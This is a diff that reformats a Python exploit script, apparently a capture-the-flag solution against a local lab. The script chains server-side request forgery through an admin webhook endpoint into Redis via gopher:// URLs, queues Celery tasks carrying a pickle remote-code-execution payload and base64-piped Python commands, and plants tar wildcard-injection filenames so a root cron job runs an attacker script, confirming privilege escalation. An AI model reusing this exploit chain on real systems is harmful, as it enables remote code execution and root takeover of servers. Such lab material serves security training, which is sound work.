@@ -12,14 +12,10 @@ import requests
 
 
 WEBHOOK_URL = "http://localhost:8080/api/admin/webhook-test"
-
 JWT = os.environ["SESSION_TOKEN"]
-
 RESULT_KEY = "ctf:rce_result"
-
 APP_DIR = "/var/log/app"
 ROOT_MARKER = "/tmp/tar_root_success"
-
 
 # ============================================================
 # Stage 4: 建立 tar wildcard injection
@@ -30,11 +26,7 @@ import os
 import socket
 import redis
 
-r = redis.Redis(
-    host="redis",
-    port=6379,
-    decode_responses=True,
-)
+r = redis.Redis(host="redis", port=6379, decode_responses=True)
 
 APP_DIR = "{APP_DIR}"
 
@@ -54,25 +46,15 @@ try:
     # 因此準備兩個看起來像 tar option 的檔名。
     # --------------------------------------------------------
 
-    proof_path = os.path.join(
-        APP_DIR,
-        "root-proof.sh",
-    )
+    proof_path = os.path.join(APP_DIR, "root-proof.sh")
 
     with open(proof_path, "w") as f:
         f.write(proof_script)
 
     os.chmod(proof_path, 0o755)
 
-    checkpoint = os.path.join(
-        APP_DIR,
-        "--checkpoint=1",
-    )
-
-    checkpoint_action = os.path.join(
-        APP_DIR,
-        "--checkpoint-action=exec=sh root-proof.sh",
-    )
+    checkpoint = os.path.join(APP_DIR, "--checkpoint=1")
+    checkpoint_action = os.path.join(APP_DIR, "--checkpoint-action=exec=sh root-proof.sh")
 
     open(checkpoint, "w").close()
     open(checkpoint_action, "w").close()
@@ -91,11 +73,7 @@ result = {{
     "target": APP_DIR,
 }}
 
-r.set(
-    "{RESULT_KEY}",
-    str(result),
-    ex=180,
-)
+r.set("{RESULT_KEY}", str(result), ex=180)
 """
 
 
@@ -110,11 +88,7 @@ STAGE5_SCRIPT = f"""
 import os
 import redis
 
-r = redis.Redis(
-    host="redis",
-    port=6379,
-    decode_responses=True,
-)
+r = redis.Redis(host="redis", port=6379, decode_responses=True)
 
 marker = "{ROOT_MARKER}"
 
@@ -145,11 +119,7 @@ else:
     }}
 
 
-r.set(
-    "{RESULT_KEY}",
-    str(result),
-    ex=180,
-)
+r.set("{RESULT_KEY}", str(result), ex=180)
 """
 
 
@@ -160,16 +130,9 @@ r.set(
 def make_rce_pickle(command):
     class RCE:
         def __reduce__(self):
-            return (
-                __import__("os").system,
-                (command,),
-            )
+            return (__import__("os").system, (command,))
 
-    payload = pickle.dumps(
-        RCE(),
-        protocol=2,
-    )
-
+    payload = pickle.dumps(RCE(), protocol=2)
     return base64.b64encode(payload).decode()
 
 
@@ -179,15 +142,9 @@ def script_to_command(script):
     避免 shell quoting / newline 問題。
     """
 
-    encoded = base64.b64encode(
-        script.encode()
-    ).decode()
+    encoded = base64.b64encode(script.encode()).decode()
 
-    return (
-        f"echo {encoded} "
-        f"| base64 -d "
-        f"| python3"
-    )
+    return f"echo {encoded} | base64 -d | python3"
 
 
 # ============================================================
@@ -259,11 +216,7 @@ def make_redis_get(key):
 # ============================================================
 
 def make_gopher_url(resp):
-    encoded = urllib.parse.quote_from_bytes(
-        resp,
-        safe="",
-    )
-
+    encoded = urllib.parse.quote_from_bytes(resp, safe="")
     return "gopher://redis:6379/_" + encoded
 
 
@@ -282,9 +235,7 @@ def ssrf_redis(resp):
     return requests.post(
         WEBHOOK_URL,
         headers=headers,
-        json={
-            "url": gopher_url,
-        },
+        json={"url": gopher_url},
         timeout=10,
     )
 
@@ -296,7 +247,6 @@ def ssrf_redis(resp):
 def decode_redis_response(response_text):
     try:
         outer = json.loads(response_text)
-
         body = outer.get("body", "")
 
         if not isinstance(body, str):
@@ -308,11 +258,7 @@ def decode_redis_response(response_text):
 
         # Redis bulk string
         if body.startswith("$"):
-            header, payload = body.split(
-                "\r\n",
-                1,
-            )
-
+            header, payload = body.split("\r\n", 1)
             length = int(header[1:])
 
             if length < 0:
@@ -347,13 +293,7 @@ def print_result(result):
     print("\n[+] Result")
     print("----------------------------------------")
 
-    print(
-        json.dumps(
-            result,
-            indent=2,
-            ensure_ascii=False,
-        )
-    )
+    print(json.dumps(result, indent=2, ensure_ascii=False))
 
     print("----------------------------------------")
 
@@ -364,12 +304,7 @@ def print_result(result):
 
 def send_task(script):
     task = make_task(script)
-
-    task_json = json.dumps(
-        task,
-        separators=(",", ":"),
-    )
-
+    task_json = json.dumps(task, separators=(",", ":"))
     resp = make_redis_lpush(task_json)
 
     return ssrf_redis(resp)
@@ -406,10 +341,7 @@ def main():
     print("\n[+] Stage 4: sending RCE payload...")
 
     response = send_task(STAGE4_SCRIPT)
-
-    print(
-        f"[+] HTTP status: {response.status_code}"
-    )
+    print(f"[+] HTTP status: {response.status_code}")
 
     # 等 worker 執行 Stage 4
     print("\n[+] Waiting for Stage 4...")
@@ -420,17 +352,9 @@ def main():
 
         time.sleep(0.5)
 
-        get_resp = make_redis_get(
-            RESULT_KEY
-        )
-
-        result_response = ssrf_redis(
-            get_resp
-        )
-
-        result = decode_redis_response(
-            result_response.text
-        )
+        get_resp = make_redis_get(RESULT_KEY)
+        result_response = ssrf_redis(get_resp)
+        result = decode_redis_response(result_response.text)
 
         if result is None:
             continue
@@ -445,15 +369,11 @@ def main():
             break
 
     if not stage4_ok:
-        print(
-            "\n[-] Stage 4 payload was not installed."
-        )
+        print("\n[-] Stage 4 payload was not installed.")
         return
 
     print("\n[+] Stage 4 complete.")
-    print(
-        f"[+] Waiting for root cron to execute tar..."
-    )
+    print(f"[+] Waiting for root cron to execute tar...")
 
     # ========================================================
     # Stage 5
@@ -466,10 +386,7 @@ def main():
 
         time.sleep(1)
 
-        print(
-            f"\n[+] Stage 5 check "
-            f"{attempt + 1}/75"
-        )
+        print(f"\n[+] Stage 5 check {attempt + 1}/75")
 
         # ----------------------------------------------------
         # 第二個 Celery task：
@@ -478,29 +395,17 @@ def main():
         # 但檢查 root cron 是否建立 marker。
         # ----------------------------------------------------
 
-        response = send_task(
-            STAGE5_SCRIPT
-        )
+        response = send_task(STAGE5_SCRIPT)
 
         if response.status_code >= 500:
-            print(
-                f"[-] HTTP {response.status_code}"
-            )
+            print(f"[-] HTTP {response.status_code}")
 
         # 等 worker 處理第二個 task
         time.sleep(0.25)
 
-        get_resp = make_redis_get(
-            RESULT_KEY
-        )
-
-        result_response = ssrf_redis(
-            get_resp
-        )
-
-        result = decode_redis_response(
-            result_response.text
-        )
+        get_resp = make_redis_get(RESULT_KEY)
+        result_response = ssrf_redis(get_resp)
+        result = decode_redis_response(result_response.text)
 
         if result is None:
             continue
@@ -511,22 +416,15 @@ def main():
         status = result.get("status")
 
         if status == "WAITING_FOR_ROOT_CRON":
-            print(
-                "[+] Root cron has not fired yet."
-            )
+            print("[+] Root cron has not fired yet.")
             continue
 
         if status == "ROOT_SUCCESS":
 
             print_result(result)
 
-            print(
-                "\n[+] Stage 5 completed!"
-            )
-
-            print(
-                "[+] Privilege escalation confirmed."
-            )
+            print("\n[+] Stage 5 completed!")
+            print("[+] Privilege escalation confirmed.")
 
             return
 
@@ -536,14 +434,9 @@ def main():
     # Timeout
     # ========================================================
 
-    print(
-        "\n[-] Stage 5 did not complete "
-        "within the timeout."
-    )
+    print("\n[-] Stage 5 did not complete within the timeout.")
 
-    print(
-        "\n[-] Check the cron configuration:"
-    )
+    print("\n[-] Check the cron configuration:")
 
     print(
         "    docker compose exec "
@@ -551,9 +444,7 @@ def main():
         "cat /etc/cron.d/*"
     )
 
-    print(
-        "\n[-] Check cron process:"
-    )
+    print("\n[-] Check cron process:")
 
     print(
         "    docker compose exec "
